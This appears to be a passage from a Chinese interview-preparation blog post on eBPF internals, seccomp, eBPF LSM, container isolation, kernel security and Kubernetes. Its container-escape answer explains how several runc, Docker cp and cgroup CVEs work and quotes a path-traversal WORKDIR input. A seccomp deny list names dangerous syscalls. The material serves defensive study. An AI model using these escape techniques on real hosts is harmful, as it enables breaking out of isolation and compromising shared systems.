+<tr>
+<td>ARRAY</td>
+<td>固定数组</td>
+<td>索引访问，不能删除 entry</td>
+<td>全局配置、统计计数器</td>
+</tr>
+<tr>
+<td>PERCPU_HASH/ARRAY</td>
+<td>per-CPU 版本</td>
+<td>每个 CPU 一份副本，无锁</td>
+<td>高频计数（性能监控常用）</td>
+</tr>
+<tr>
+<td>LRU_HASH</td>
+<td>带 LRU 淘汰的哈希表</td>
+<td>满时自动淘汰最久未用</td>
+<td>缓存、有过期需求的场景</td>
+</tr>
+<tr>
+<td>LPM_TRIE</td>
+<td>最长前缀匹配树</td>
+<td>IP 地址/CIDR 匹配</td>
+<td>网络策略（按 IP 段放行/拒绝）</td>
+</tr>
+<tr>
+<td>RINGBUF</td>
+<td>单共享环形缓冲区</td>
+<td>保序、内存高效</td>
+<td>事件传输（推荐，5.8+）</td>
+</tr>
+<tr>
+<td>PERF_EVENT_ARRAY</td>
+<td>per-CPU 环形缓冲区</td>
+<td>老 API，可能乱序</td>
+<td>事件传输（兼容老内核）</td>
+</tr>
+<tr>
+<td>PROG_ARRAY</td>
+<td>存 BPF 程序 fd</td>
+<td>用于 tail call</td>
+<td>拆分复杂逻辑到子程序</td>
+</tr>
+<tr>
+<td>STACK_TRACE</td>
+<td>调用栈存储</td>
+<td>保存内核/用户态调用栈</td>
+<td>性能 profiling</td>
+</tr>
+<tr>
+<td>TASK_STORAGE</td>
+<td>按 task_struct 索引</td>
+<td>跟随进程生命周期自动回收</td>
+<td>进程级安全状态（5.11+）</td>
+</tr>
+<tr>
+<td>CGROUP_STORAGE</td>
+<td>按 cgroup 索引</td>
+<td>跟随 cgroup 生命周期</td>
+<td>容器级策略/统计</td>
+</tr>
+</tbody></table>
+<h3 id="2-5-BPF-Helper-函数"><a href="#2-5-BPF-Helper-函数" class="headerlink" title="2.5 BPF Helper 函数"></a>2.5 BPF Helper 函数</h3><p>BPF 程序在内核中运行，不能调用任意内核函数，只能调用内核提供的 <strong>helper 函数</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">数据读取：</span><br><span class="line">  bpf_probe_read_kernel(dst, size, src)    → 从内核地址读数据</span><br><span class="line">  bpf_probe_read_user(dst, size, src)      → 从用户态地址读数据</span><br><span class="line">  bpf_core_read(dst, size, src)            → CO-RE 版本，自动重定位</span><br><span class="line"></span><br><span class="line">上下文获取：</span><br><span class="line">  bpf_get_current_pid_tgid()    → 返回 (tgid &lt;&lt; 32) | pid（tgid 就是通常说的 PID）</span><br><span class="line">  bpf_get_current_uid_gid()     → 返回 (gid &lt;&lt; 32) | uid</span><br><span class="line">  bpf_get_current_comm(buf, sz) → 获取当前进程名（如 &quot;python3&quot;）</span><br><span class="line">  bpf_get_current_task()        → 获取 task_struct 指针</span><br><span class="line">  bpf_get_current_cgroup_id()   → 获取当前进程的 cgroup ID（用于关联到容器）</span><br><span class="line"></span><br><span class="line">Map 操作：</span><br><span class="line">  bpf_map_lookup_elem(map, key)              → 查找</span><br><span class="line">  bpf_map_update_elem(map, key, val, flags)  → 插入&#x2F;更新</span><br><span class="line">  bpf_map_delete_elem(map, key)              → 删除</span><br><span class="line"></span><br><span class="line">事件输出：</span><br><span class="line">  bpf_ringbuf_reserve(ringbuf, size, flags)  → 在 ring buffer 中预留空间</span><br><span class="line">  bpf_ringbuf_submit(data, flags)            → 提交事件</span><br><span class="line">  bpf_perf_event_output(ctx, map, flags, data, size) → perf buffer 输出</span><br><span class="line"></span><br><span class="line">时间：  bpf_ktime_get_ns()   → 纳秒级时间戳（CLOCK_MONOTONIC）</span><br><span class="line">网络：  bpf_skb_load_bytes() &#x2F; bpf_redirect()</span><br><span class="line">调试：  bpf_printk(fmt, ...)  → 输出到 &#x2F;sys&#x2F;kernel&#x2F;debug&#x2F;tracing&#x2F;trace_pipe</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-6-Verifier、JIT、BTF、CO-RE"><a href="#2-6-Verifier、JIT、BTF、CO-RE" class="headerlink" title="2.6 Verifier、JIT、BTF、CO-RE"></a>2.6 Verifier、JIT、BTF、CO-RE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">                    BPF 字节码 (.o)</span><br><span class="line">                         │</span><br><span class="line">                    ┌────▼────┐</span><br><span class="line">                    │ Verifier │ ← 静态分析：控制流、内存安全、类型安全</span><br><span class="line">                    └────┬────┘</span><br><span class="line">                         │ 验证通过</span><br><span class="line">                    ┌────▼────┐</span><br><span class="line">                    │   JIT   │ ← 字节码 → 机器码（x86&#x2F;ARM&#x2F;...），接近原生性能</span><br><span class="line">                    └────┬────┘</span><br><span class="line">                         │</span><br><span class="line">                    内核中执行</span><br><span class="line"></span><br><span class="line">BTF (BPF Type Format)：</span><br><span class="line">  - 内核编译时生成的类型元数据（&#x2F;sys&#x2F;kernel&#x2F;btf&#x2F;vmlinux）</span><br><span class="line">  - 描述内核所有结构体的字段名、类型、偏移</span><br><span class="line">  - Verifier 用它做类型检查，CO-RE 用它做重定位</span><br><span class="line"></span><br><span class="line">CO-RE (Compile Once Run Everywhere)：</span><br><span class="line">  - 问题：task_struct 的 pid 字段在不同内核版本的偏移不同</span><br><span class="line">  - 编译时：记录&quot;我要访问 task_struct.pid&quot;这个语义</span><br><span class="line">  - 加载时：libbpf 读取当前内核的 BTF，计算实际偏移，patch 字节码</span><br><span class="line">  - 效果：一次编译的 .o 文件可以在不同内核版本上运行</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-7-程序生命周期与工具"><a href="#2-7-程序生命周期与工具" class="headerlink" title="2.7 程序生命周期与工具"></a>2.7 程序生命周期与工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">生命周期：</span><br><span class="line">1. 编写 C → 2. clang -target bpf 编译 → 3. bpftool gen skeleton（可选）</span><br><span class="line">4. 用户态 loader 加载（bpf() 系统调用 → verifier → JIT）</span><br><span class="line">5. attach 到 hook 点 → 6. 运行 → 7. destroy 卸载</span><br><span class="line"></span><br><span class="line">常用工具：</span><br><span class="line">bpftool prog list &#x2F; show &#x2F; dump xlated &#x2F; dump jited &#x2F; profile</span><br><span class="line">bpftool map list &#x2F; dump</span><br><span class="line">bpftool net list</span><br><span class="line">bpftool btf dump file &#x2F;sys&#x2F;kernel&#x2F;btf&#x2F;vmlinux</span><br><span class="line"></span><br><span class="line">bpftrace（一行命令搞定简单追踪）：</span><br><span class="line">  bpftrace -e &#39;kprobe:do_sys_openat2 &#123; printf(&quot;%s open\n&quot;, comm); &#125;&#39;</span><br><span class="line">  bpftrace -e &#39;tracepoint:sched:sched_process_exec &#123; printf(&quot;exec %s\n&quot;, str(args.filename)); &#125;&#39;</span><br><span class="line">  bpftrace -e &#39;uprobe:&#x2F;usr&#x2F;bin&#x2F;python3:_PyEval_EvalFrameDefault &#123; printf(&quot;py frame\n&quot;); &#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、技术问答：eBPF"><a href="#三、技术问答：eBPF" class="headerlink" title="三、技术问答：eBPF"></a>三、技术问答：eBPF</h2><h3 id="Q-eBPF-程序的类型有哪些？Tracepoint、kprobe、LSM-hook-分别适合什么场景？"><a href="#Q-eBPF-程序的类型有哪些？Tracepoint、kprobe、LSM-hook-分别适合什么场景？" class="headerlink" title="Q: eBPF 程序的类型有哪些？Tracepoint、kprobe、LSM hook 分别适合什么场景？"></a>Q: eBPF 程序的类型有哪些？Tracepoint、kprobe、LSM hook 分别适合什么场景？</h3><blockquote>
+<p><strong>kprobe/kretprobe</strong> 可以 hook 内核中几乎任意函数，灵活性最高，适合调试和深度分析。缺点是依赖内核符号，不同版本可能函数名或参数变化，不属于稳定 ABI。比如我在做 eBPF 审计时，经常通过 kprobe 去 hook 特定内核函数来观察内部状态。</p>
+<p><strong>Tracepoint</strong> 是内核预定义的稳定 hook 点，性能好且跨版本兼容。适合生产环境的长期监控，比如 <code>sched_process_exec</code>、<code>syscalls:sys_enter_openat</code> 这类。做 Agent Runtime 监控首选 tracepoint，因为稳定且开销小。</p>
+<p><strong>LSM hook（BPF_PROG_TYPE_LSM）</strong> 是唯一能做访问控制决策的类型——前两者只能观测，LSM 可以返回非零值拒绝操作。适合策略强制执行场景，比如阻止 Code Interpreter 访问 <code>/etc/shadow</code> 或连接非白名单网络。相比 AppArmor/SELinux，eBPF LSM 最大的优势是动态加载卸载，不需要重启服务或重新编译策略。</p>
+<p>还有网络类的 XDP（最早期的包处理，适合 DDoS 防护）、TC（流量分类和策略）、cgroup/skb（按 cgroup 做网络策略，Cilium 大量使用）。以及比较新的 struct_ops 用于 sched_ext 调度器扩展。</p>
+<p>在 Agent Runtime Security 的场景下，我会组合使用：tracepoint 做基础遥测采集，LSM hook 做安全策略强制执行，kprobe 用于特定场景的深度分析和调试。</p>
+</blockquote>
+<h3 id="Q-eBPF-verifier-做了什么？"><a href="#Q-eBPF-verifier-做了什么？" class="headerlink" title="Q: eBPF verifier 做了什么？"></a>Q: eBPF verifier 做了什么？</h3><blockquote>
+<p>Verifier 是 eBPF 的安全基石，负责在程序加载到内核之前做静态分析，确保程序不会导致内核崩溃或安全问题。主要做几件事：</p>
+<ol>
+<li><strong>控制流检查</strong>：确保程序是 DAG（有向无环图），不允许无限循环（bounded loops 在 5.3+ 有限支持）</li>
+<li><strong>指令数限制</strong>：当前上限约 100 万条已验证指令</li>
+<li><strong>内存安全</strong>：追踪每个寄存器的类型和值范围，确保所有指针访问都在合法边界内，不会越界读写</li>
+<li><strong>类型安全</strong>：区分 PTR_TO_CTX、PTR_TO_MAP_VALUE、PTR_TO_STACK 等，不同类型的指针有不同的允许操作</li>
+<li><strong>Helper 函数权限检查</strong>：不同 BPF 程序类型只能调用特定的 helper，非特权程序能调用的 helper 更少</li>
+<li><strong>推测执行安全</strong>：给 ALU 操作插 barrier 以防 Spectre 类攻击</li>
+</ol>
+<p>但 verifier 本身是极其复杂的代码，也是攻击面。我在 STAR Labs 做 eBPF Audit 时，重点关注的就是 verifier 的逻辑漏洞——比如对寄存器值范围的跟踪在某些边界条件下可能出错（如符号扩展、移位操作），导致 verifier 认为安全的操作实际上能越界。CVE-2021-4001 就是 eBPF 子系统中的 race condition 问题。后续在 2025-2026 年发现的几个内核 CVE 也涉及 eBPF 相关的边界问题。</p>
+</blockquote>
+<h3 id="Q-ring-buffer-vs-perf-buffer？"><a href="#Q-ring-buffer-vs-perf-buffer？" class="headerlink" title="Q: ring buffer vs perf buffer？"></a>Q: ring buffer vs perf buffer？</h3><blockquote>
+<p><strong>Perf buffer</strong> 是 per-CPU 的，每个 CPU 一个独立 buffer。优点是无锁写入（每个 CPU 写自己的 buffer），缺点是用户态需要 poll 多个 fd，事件可能乱序（不同 CPU 上的事件没有全局排序），而且如果某些 CPU 负载高某些空闲，内存利用率不均匀。</p>
+<p><strong>Ring buffer</strong>（5.8+ 引入）是所有 CPU 共享的单一缓冲区，用 lock-free 的方式实现多生产者单消费者。优点是用户态只需 poll 一个 fd，事件天然保序，内存利用率更高。缺点是在高并发写入时可能有 cache line 竞争，但实测在大多数场景下性能不比 perf buffer 差，甚至更好。</p>
+<p>做 Agent Runtime 监控优先用 ring buffer，因为保序对安全事件分析很重要——需要知道”先 open 文件还是先 connect 网络”这种时序关系。</p>
+</blockquote>
+<h3 id="Q-CO-RE-是什么？为什么重要？"><a href="#Q-CO-RE-是什么？为什么重要？" class="headerlink" title="Q: CO-RE 是什么？为什么重要？"></a>Q: CO-RE 是什么？为什么重要？</h3><blockquote>
+<p>Compile Once Run Everywhere。核心问题是：不同内核版本的结构体布局可能不同，比如 <code>task_struct</code> 在 5.10 和 6.1 中字段偏移不一样。</p>
+<p>CO-RE 通过三个组件解决：</p>
+<ol>
+<li><strong>BTF（BPF Type Format）</strong>：内核编译时生成的类型信息，描述结构体布局</li>
+<li><strong>libbpf 重定位</strong>：编译时记录”我要访问 task_struct 的 pid 字段”这个语义，加载时 libbpf 根据当前内核的 BTF 计算实际偏移并 patch 字节码</li>
+<li>**bpf_core_read()**：替代直接指针解引用，配合重定位工作</li>
+</ol>
+<p>这对生产环境部署非常关键——不可能为每个客户的内核版本都编译一份 eBPF 程序。像 Tetragon、Tracee 这些工具都依赖 CO-RE 实现跨内核版本部署。</p>
+</blockquote>
+<h3 id="Q-你在-eBPF-audit-中发现过什么类型的漏洞？"><a href="#Q-你在-eBPF-audit-中发现过什么类型的漏洞？" class="headerlink" title="Q: 你在 eBPF audit 中发现过什么类型的漏洞？"></a>Q: 你在 eBPF audit 中发现过什么类型的漏洞？</h3><blockquote>
+<p>在 STAR Labs 参与的 eBPF Audit Project 主要关注几个攻击面：</p>
+<ol>
+<li><strong>Verifier 逻辑漏洞</strong>：verifier 对某些操作的值范围推导不正确，比如在特定 ALU 操作序列后，verifier 认为一个值在 [0, 100] 范围内，但实际运行时可以超出这个范围，导致后续的 map 访问或指针操作越界</li>
+<li><strong>JIT 编译器问题</strong>：verifier 验证的是 eBPF 字节码，但实际执行的是 JIT 编译后的机器码。如果 JIT 的翻译与 verifier 的假设不一致，就可能产生安全漏洞</li>
+<li><strong>Helper 函数实现缺陷</strong>：某些 helper 函数的实现可能在边界条件下有问题，比如参数校验不够严格</li>
+<li><strong>并发与 race condition</strong>：eBPF map 的并发访问、程序加载/卸载的竞态</li>
+</ol>
+<p>具体到获得的 CVE-2025-38477、CVE-2025-40083、CVE-2025-68325 以及 2026 年的几个 CVE，涉及了上述多个方面。这些经验让我不仅知道 eBPF 能做什么安全监控，更知道 eBPF 自身的攻击面在哪里——在多租户环境中，如果允许租户加载 eBPF 程序（通常不应该），这些都是需要考虑的风险。</p>
+</blockquote>
+<hr>
+<h2 id="四、技术问答：容器与隔离安全"><a href="#四、技术问答：容器与隔离安全" class="headerlink" title="四、技术问答：容器与隔离安全"></a>四、技术问答：容器与隔离安全</h2><h3 id="Q-Linux-Namespace-有哪些类型？"><a href="#Q-Linux-Namespace-有哪些类型？" class="headerlink" title="Q: Linux Namespace 有哪些类型？"></a>Q: Linux Namespace 有哪些类型？</h3><blockquote>
+<p>目前有 8 种：</p>
+<ol>
+<li><strong>Mount namespace</strong>：隔离挂载点，容器看到自己的文件系统视图</li>
+<li><strong>PID namespace</strong>：隔离进程 ID 空间，容器内 PID 1 是自己的 init 进程</li>
+<li><strong>Network namespace</strong>：隔离网络栈，独立的网卡、路由表、iptables 规则</li>
+<li><strong>IPC namespace</strong>：隔离 System V IPC 和 POSIX 消息队列</li>
+<li><strong>UTS namespace</strong>：隔离 hostname 和 domainname</li>
+<li><strong>User namespace</strong>：隔离 UID/GID 映射，非特权用户可以在 ns 内获得 root</li>
+<li><strong>Cgroup namespace</strong>：隔离 cgroup 视图，容器看到的 cgroup 根是自己的</li>
+<li><strong>Time namespace</strong>（5.6+ 引入）：隔离 CLOCK_MONOTONIC 和 CLOCK_BOOTTIME</li>
+</ol>
+<p>对 Agent Runtime 最关键的是 mount（文件隔离）、network（网络隔离）和 PID（进程隔离）。User namespace 比较特殊——它允许非特权用户创建其他类型的 namespace，这扩大了内核攻击面，是很多提权链的起点。不少安全加固方案会建议 <code>sysctl kernel.unprivileged_userns_clone=0</code> 关闭它。</p>
+</blockquote>
+<h3 id="Q-Seccomp-BPF-的工作原理？如何为-Code-Interpreter-定制？"><a href="#Q-Seccomp-BPF-的工作原理？如何为-Code-Interpreter-定制？" class="headerlink" title="Q: Seccomp BPF 的工作原理？如何为 Code Interpreter 定制？"></a>Q: Seccomp BPF 的工作原理？如何为 Code Interpreter 定制？</h3><blockquote>
+<p>Seccomp BPF 通过 <code>prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER)</code> 或 <code>seccomp()</code> 系统调用安装一个 cBPF 过滤器。每次进程发起 syscall 时，内核先把 syscall 编号和参数传给这个 BPF 程序，程序返回动作：ALLOW（允许）、KILL（杀进程）、ERRNO（返回错误码）、TRACE（通知 ptrace）、LOG（记录但允许）。</p>
+<p>Docker 默认的 seccomp profile 大概禁止了 44 个危险 syscall，包括 <code>mount</code>、<code>umount</code>、<code>ptrace</code>、<code>kexec_load</code>、<code>init_module</code>、<code>reboot</code> 等。</p>
+<p>为 Code Interpreter 定制的话，思路是从<strong>白名单</strong>出发而不是黑名单：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">允许的（约 80-100 个）：</span><br><span class="line">- 基础：read, write, open, close, mmap, mprotect, brk, futex...</span><br><span class="line">- Python 运行时需要的：clone(限制flags), execve(限制路径), pipe, epoll...</span><br><span class="line">- 网络（受限）：socket(AF_INET only), connect, sendto, recvfrom</span><br><span class="line"></span><br><span class="line">明确禁止的：</span><br><span class="line">- 内核模块：init_module, finit_module, delete_module</span><br><span class="line">- 挂载：mount, umount2, pivot_root</span><br><span class="line">- 调试：ptrace, process_vm_readv&#x2F;writev</span><br><span class="line">- 特权：setuid, setgid, setns, unshare (防止创建新 namespace)</span><br><span class="line">- 关键：keyctl, bpf (防止加载 eBPF 程序)</span><br></pre></td></tr></table></figure>
+
+<p>注意 seccomp 只过滤 syscall 编号和参数，不能检查路径字符串（因为指针指向用户空间）。所以文件路径级别的控制需要 LSM 配合。</p>
+</blockquote>
+<h3 id="Q-eBPF-LSM-和传统-LSM-的区别？"><a href="#Q-eBPF-LSM-和传统-LSM-的区别？" class="headerlink" title="Q: eBPF LSM 和传统 LSM 的区别？"></a>Q: eBPF LSM 和传统 LSM 的区别？</h3><blockquote>
+<p><strong>传统 LSM（AppArmor/SELinux）</strong>：</p>
+<ul>
+<li>策略在用户态编译后加载到内核，修改策略通常需要重新加载甚至重启服务</li>
+<li>AppArmor 基于路径，比较直觉但不够灵活；SELinux 基于标签，策略表达力强但复杂度极高</li>
+<li>策略是静态的，不能根据运行时上下文做动态决策</li>
+</ul>
+<p><strong>eBPF LSM（KRSI）</strong>：</p>
+<ul>
+<li>可以动态加载/卸载，不影响已有策略，不需要重启</li>
+<li>可以访问 eBPF map，因此能做<strong>有状态的决策</strong>：比如”同一个进程 5 秒内 open 了 100 个文件则拒绝”</li>
+<li>可以与其他 eBPF 程序共享数据，实现观测和控制的联动</li>
+<li>可以获取更丰富的上下文：通过 bpf_get_current_task() 拿到进程信息，通过 cgroup ID 关联到具体容器</li>
+</ul>
+<p><strong>劣势</strong>：</p>
+<ul>
+<li>需要 5.7+ 内核且编译时开启 CONFIG_BPF_LSM</li>
+<li>社区成熟度不如 AppArmor/SELinux，策略管理工具链还在完善</li>
+<li>策略的审计和合规认证（比如 FIPS）目前不如传统 LSM</li>
+</ul>
+<p>在多租户 Agent 场景下，倾向于<strong>分层使用</strong>：AppArmor/SELinux 做基础的兜底策略（因为成熟可审计），eBPF LSM 做动态的细粒度控制和上下文感知决策。</p>
+</blockquote>
+<h3 id="Q-容器逃逸的典型攻击面？（结合经历深入回答）"><a href="#Q-容器逃逸的典型攻击面？（结合经历深入回答）" class="headerlink" title="Q: 容器逃逸的典型攻击面？（结合经历深入回答）"></a>Q: 容器逃逸的典型攻击面？（结合经历深入回答）</h3><blockquote>
+<p><strong>1. 容器运行时漏洞：</strong></p>
+<ul>
+<li><strong>CVE-2019-5736（runc）</strong>：这个我做过详细公开分析。攻击者在容器内通过 <code>/proc/self/exe</code> 获取 runc 二进制的引用，利用 O_PATH fd + <code>/proc/self/fd/N</code> 的方式在 runc 执行期间覆写宿主机上的 runc 二进制。核心问题是容器进程在 runc exec 阶段可以访问到 runc 自身的二进制文件。修复方式是 runc 先 clone 自身到 memfd 再 exec</li>
+<li><strong>CVE-2024-21626（runc）</strong>：runc 在处理 <code>WORKDIR</code> 指令时存在 fd 泄漏，一个指向 host 文件系统的 fd 没有被设置 <code>O_CLOEXEC</code>，攻击者通过 <code>WORKDIR /proc/self/fd/N/../../../</code> 这种方式访问宿主机文件系统</li>
+<li><strong>CVE-2019-14271（Docker cp）</strong>：docker cp 命令 nsenter 进入容器 mount namespace 但链接了 host 的 libnss，攻击者替换 libnss 库文件实现 host 代码执行</li>
+</ul>
+<p><strong>2. 内核漏洞提权后逃逸：</strong></p>
+<ul>
+<li>容器共享宿主机内核，任何内核提权漏洞都可能导致逃逸。2021 年天府杯我就做过 Ubuntu 上的 Docker 逃逸 + 本地提权利用链</li>
+</ul>
+<p><strong>3. 配置不当：</strong></p>
+<ul>
+<li>特权容器（<code>--privileged</code>）、危险挂载（Docker socket）、危险 capability（<code>SYS_ADMIN</code>、<code>SYS_PTRACE</code>）</li>
+</ul>
+<p><strong>4. Cgroup 逃逸：</strong></p>
+<ul>
+<li>CVE-2022-0492：写入 cgroup 的 <code>release_agent</code> 文件，在 host namespace 执行命令</li>
+</ul>
+<p>对于 AI Agent 的 Code Interpreter 场景，最现实的威胁是：Agent 被 prompt injection 后生成恶意代码 → 代码在容器内执行尝试内核漏洞利用或利用配置不当逃逸。隔离方案要假设容器内运行的代码是不可信的。</p>
+</blockquote>
+<h3 id="Q-多租户-Agent-环境下的隔离粒度怎么选？"><a href="#Q-多租户-Agent-环境下的隔离粒度怎么选？" class="headerlink" title="Q: 多租户 Agent 环境下的隔离粒度怎么选？"></a>Q: 多租户 Agent 环境下的隔离粒度怎么选？</h3><blockquote>
+<p><strong>隔离方案对比：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──────────────────┬──────────┬──────────┬──────────┐</span><br><span class="line">│                  │ 隔离强度  │  性能开销 │  灵活性   │</span><br><span class="line">├──────────────────┼──────────┼──────────┼──────────┤</span><br><span class="line">│ Namespace+cgroup │   中     │   低     │   高     │</span><br><span class="line">│ Seccomp BPF      │   中     │   极低   │   中     │</span><br><span class="line">│ AppArmor&#x2F;SELinux │   中高   │   低     │   低     │</span><br><span class="line">│ eBPF LSM         │   中高   │   低     │   高     │ ← 动态策略</span><br><span class="line">│ gVisor           │   高     │   中高   │   低     │</span><br><span class="line">│ Kata&#x2F;microVM     │   极高   │   中     │   中     │</span><br><span class="line">│ Firecracker      │   极高   │   低中   │   中     │</span><br><span class="line">└──────────────────┴──────────┴──────────┴──────────┘</span><br></pre></td></tr></table></figure>
+
+<p>建议<strong>分层防御</strong>：</p>
+<p><strong>第一层：强隔离边界</strong> — Firecracker microVM / Kata，每个租户独立 VM，独立内核<br><strong>第二层：容器内加固</strong> — Seccomp 白名单 + eBPF LSM + drop capabilities + no-new-privileges<br><strong>第三层：网络隔离</strong> — Cilium eBPF 网络策略 + DNS 过滤<br><strong>第四层：资源限制</strong> — Cgroup v2 限制 CPU/内存/IO/PID</p>
+<p>蚂蚁集团的 AntCWPP（Kata + eBPF LSM）是大规模生产环境的实践案例。</p>
+</blockquote>
+<hr>
+<h2 id="五、技术问答：内核安全"><a href="#五、技术问答：内核安全" class="headerlink" title="五、技术问答：内核安全"></a>五、技术问答：内核安全</h2><h3 id="Q-Linux-内核常见漏洞类型？"><a href="#Q-Linux-内核常见漏洞类型？" class="headerlink" title="Q: Linux 内核常见漏洞类型？"></a>Q: Linux 内核常见漏洞类型？</h3><blockquote>
+<p>UAF（Use-After-Free）、堆溢出、整数溢出、race condition、类型混淆、信息泄漏。其中 UAF 和 race condition 是最常见的，因为内核有大量的并发和复杂的对象生命周期管理。</p>
+</blockquote>
+<h3 id="Q-内核利用缓解措施？"><a href="#Q-内核利用缓解措施？" class="headerlink" title="Q: 内核利用缓解措施？"></a>Q: 内核利用缓解措施？</h3><blockquote>
+<p>KASLR（地址随机化）、SMEP/SMAP（禁止内核执行/访问用户态内存）、KPTI（内核页表隔离，防 Meltdown）、CFI（控制流完整性）、stack canary（栈溢出检测）、USERCOPY hardening（限制内核从用户态拷贝的范围）。</p>
+</blockquote>
+<h3 id="Q-如何调试内核？"><a href="#Q-如何调试内核？" class="headerlink" title="Q: 如何调试内核？"></a>Q: 如何调试内核？</h3><blockquote>
+<p>GDB + QEMU/VMware、kgdb、ftrace、bpftrace、crash dump 分析。我做漏洞复现和利用研究时通常用 GDB + QEMU 搭建调试环境。</p>
+</blockquote>
+<h3 id="Q-syzkaller-怎么工作？"><a href="#Q-syzkaller-怎么工作？" class="headerlink" title="Q: syzkaller 怎么工作？"></a>Q: syzkaller 怎么工作？</h3><blockquote>
+<p>基于 syscall 描述（syzlang），生成 syscall 序列，利用 coverage 反馈引导变异。它有自己的 DSL 描述每个 syscall 的参数类型和约束，通过 KCOV 收集代码覆盖率信息来引导 fuzzer 探索新路径。</p>
+</blockquote>
+<hr>
+<h2 id="六、技术问答：Kubernetes"><a href="#六、技术问答：Kubernetes" class="headerlink" title="六、技术问答：Kubernetes"></a>六、技术问答：Kubernetes</h2><h3 id="K8s-基础架构速查"><a href="#K8s-基础架构速查" class="headerlink" title="K8s 基础架构速查"></a>K8s 基础架构速查</h3><blockquote>
+<p>面试前确保能画出这张架构图并解释每个组件的作用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">K8s 集群架构</span><br><span class="line"></span><br><span class="line">┌─── Control Plane (Master) ────────────────────────────┐</span><br><span class="line">│                                                        │</span><br><span class="line">│  kube-apiserver ← 所有操作的入口，REST API              │</span><br><span class="line">│       │                                                │</span><br><span class="line">│  etcd ← 存储所有集群状态的 KV 数据库（Secret 也在这里）  │</span><br><span class="line">│       │                                                │</span><br><span class="line">│  kube-scheduler ← 决定 Pod 调度到哪个 Node              │</span><br><span class="line">│       │                                                │</span><br><span class="line">│  kube-controller-manager ← 运行各种控制器               │</span><br><span class="line">│    （Deployment、ReplicaSet、Node Controller 等）       │</span><br><span class="line">│                                                        │</span><br><span class="line">│  cloud-controller-manager（可选）← 对接云厂商 API       │</span><br><span class="line">└────────────────────────────────────────────────────────┘</span><br><span class="line">         │ kubelet 向 apiserver 注册 + 汇报状态</span><br><span class="line">         │ apiserver 向 kubelet 下发 Pod 调度指令</span><br><span class="line">         ▼</span><br><span class="line">┌─── Worker Node ───────────────────────────────────────┐</span><br><span class="line">│                                                        │</span><br><span class="line">│  kubelet ← 每个 Node 上的 agent，负责管理 Pod 生命周期  │</span><br><span class="line">│    │                                                   │</span><br><span class="line">│    ├─→ 容器运行时（containerd &#x2F; CRI-O）                 │</span><br><span class="line">│    │     └─→ runc &#x2F; kata &#x2F; gVisor（OCI runtime）       │</span><br><span class="line">│    │           └─→ 创建容器（namespace + cgroup + rootfs）│</span><br><span class="line">│    │                                                   │</span><br><span class="line">│    └─→ kube-proxy (或 Cilium eBPF 替代)                │</span><br><span class="line">│          └─→ Service 负载均衡 + 网络策略                │</span><br><span class="line">│                                                        │</span><br><span class="line">│  ┌─── Pod ────────────────────────────┐                │</span><br><span class="line">│  │ Container A    Container B          │                │</span><br><span class="line">│  │ (共享 network namespace + volumes)  │                │</span><br><span class="line">│  │ 有独立的 IP 地址                    │                │</span><br><span class="line">│  └────────────────────────────────────┘                │</span><br><span class="line">└────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p><strong>核心概念：</strong></p>
+<ul>
